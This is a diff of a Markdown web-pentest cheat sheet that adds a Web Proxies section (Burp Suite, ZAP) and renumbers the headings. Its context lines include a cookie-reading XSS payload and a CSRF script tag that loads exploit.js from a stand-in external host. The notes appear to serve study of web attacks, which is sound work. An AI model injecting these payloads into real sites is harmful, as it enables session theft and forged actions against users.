@@ -3,12 +3,13 @@
 Overview
 ---------
 1. - [Web Requests](#1---web-requests)
-2. - [Online Resources](#2---online-resources)
-3. - [Sensitive Data Exposure](#3---sensitive-data-exposure)
-4. - [HTML Injection](#4---html-injection)
-5. - [Cross-Site Scripting (XSS)](#5---cross-site-scripting-xss)
-6. - [Cross-Site Request Forgery (CSRF)](#6---cross-site-request-forgery-csrf)
-7. - [Exploit Research](#7---exploit-research)
+2. - [Web Proxies](#2---web-proxies)
+3. - [Online Resources](#3---online-resources)
+4. - [Sensitive Data Exposure](#4---sensitive-data-exposure)
+5. - [HTML Injection](#5---html-injection)
+6. - [Cross-Site Scripting (XSS)](#6---cross-site-scripting-xss)
+7. - [Cross-Site Request Forgery (CSRF)](#7---cross-site-request-forgery-csrf)
+8. - [Exploit Research](#8---exploit-research)
 
    
 #1. - Web Requests
@@ -36,7 +37,14 @@ $ curl -H 'Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' <URL>
 F12
 ```
 
-#2. - Online Resources
+#2. - Web Proxies
+-----------------------------------------
+
+- Burp Suite
+
+- ZAP Proxy
+
+#3. - Online Resources
 -----------------------------------------
 
 - OWASP Web Security Testing Guide
@@ -64,7 +72,7 @@ https://htmlg.com/html-editor/
 https://jsfiddle.net/
 ```
 
-#3. - Sensitive Data Exposure
+#4. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -75,7 +83,7 @@ OR
 CTRL + U
 ```
 
-#4. - HTML Injection
+#5. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -84,7 +92,7 @@ CTRL + U
 <a href="http://www.google.com">Click Me</a>
 ```
 
-#5. - Cross-Site Scripting (XSS)
+#6. - Cross-Site Scripting (XSS)
 -----------------------------------------
 
 *Reflected XSS	= Occurs when user input is displayed on the page after processing (e.g., search result or error message).*
@@ -99,7 +107,7 @@ CTRL + U
 #"><img src=/ onerror=alert(document.cookie)>
 ```
 
-#6. - Cross-Site Request Forgery (CSRF)
+#7. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -108,7 +116,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#7. - Exploit Research
+#8. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
